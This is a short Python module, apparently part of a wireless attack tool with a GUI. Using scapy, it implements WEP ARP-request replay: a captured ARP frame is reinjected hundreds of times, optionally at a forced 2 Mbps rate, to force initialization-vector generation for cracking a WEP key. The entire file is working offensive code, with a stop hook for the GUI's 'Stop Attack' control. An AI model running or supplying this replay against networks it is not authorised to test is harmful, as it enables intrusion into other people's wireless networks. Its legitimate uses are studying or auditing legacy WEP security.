"""WEP ARP-request replay: reinject a captured frame to force IV generation."""

from __future__ import annotations

import threading

from scapy.packet import Packet
from scapy.sendrecv import sendp

from ..frames import with_forced_rate


def replay_arp(
    iface: str,
    pkt: Packet,
    count: int = 500,
    interval: float = 0.01,
    low_rate: bool = False,
    stop_event: threading.Event | None = None,
) -> int:
    """Reinject a captured WEP ARP-request frame repeatedly; returns count sent.

    low_rate: force a 2 Mbps injection rate instead of replaying the
    frame's own captured RadioTap -- see frames.with_forced_rate.

    stop_event: checked between each frame so the GUI's Stop Attack can
    abort mid-burst.
    """
    if low_rate:
        pkt = with_forced_rate(pkt, mbps=2)
    sent = 0
    for _ in range(count):
        if stop_event is not None and stop_event.is_set():
            return sent
        sendp(pkt, iface=iface, count=1, inter=interval, verbose=False)
        sent += 1
    return sent
